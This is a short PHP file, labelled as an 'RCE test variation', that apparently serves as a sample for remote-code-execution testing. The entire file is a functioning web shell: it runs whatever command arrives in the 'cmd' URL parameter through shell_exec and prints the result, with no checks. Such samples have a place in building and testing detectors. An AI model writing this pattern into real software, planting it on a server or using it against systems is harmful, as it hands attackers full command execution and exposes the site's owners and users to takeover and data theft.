<?php
// RCE test variation #1384
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>